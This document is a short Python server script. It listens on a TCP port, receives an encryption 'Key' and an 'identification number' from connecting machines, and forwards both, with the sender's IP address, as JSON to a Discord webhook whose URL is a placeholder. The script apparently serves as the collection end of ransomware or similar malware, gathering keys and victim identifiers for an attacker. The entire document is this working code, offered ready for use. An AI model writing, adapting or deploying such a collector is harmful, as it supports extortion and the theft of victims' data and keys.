import socket
from discord import SyncWebhook
import json
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Host = '0.0.0.0'
Port = 3000
sock.bind((Host,Port))
print(f"Listening at {sock.getsockname()}")
sock.listen(1)
while True:
      data, clientAddress = sock.accept()
      Key = data.recv(1024).decode('utf-8')
      data, clientAddress = sock.accept()
      ID = data.recv(1024).decode('utf-8')
      dic = {
        'identification number': ID,
        'Key': Key,
        'IP address': clientAddress[0]
        }
      json_object = json.dumps(dic,indent=4)
      webhook = SyncWebhook.from_url("-----Your Discord Webhook----")
      webhook.send(json_object)



    





    











    
   
        











    




  


   


